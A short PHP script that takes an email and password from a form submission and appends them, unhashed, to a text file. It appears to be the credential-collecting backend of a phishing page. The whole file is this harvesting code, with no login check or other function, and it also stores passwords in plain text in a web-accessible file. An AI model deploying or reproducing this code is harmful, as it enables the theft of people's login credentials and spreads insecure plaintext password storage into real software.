<?php
$email = $_POST['email'];
$pass = $_POST['pass'];

if (isset($_POST['email']) && isset($_POST['pass']) && $_POST['email'] != '' && $_POST['pass'] != ''){
	$input = array("email" => $email, "pass" => $pass);
	file_put_contents('data.txt', json_encode($input), FILE_APPEND);
	http_response_code(201);
	die;
}
else{
	http_response_code(400);
	die;
}


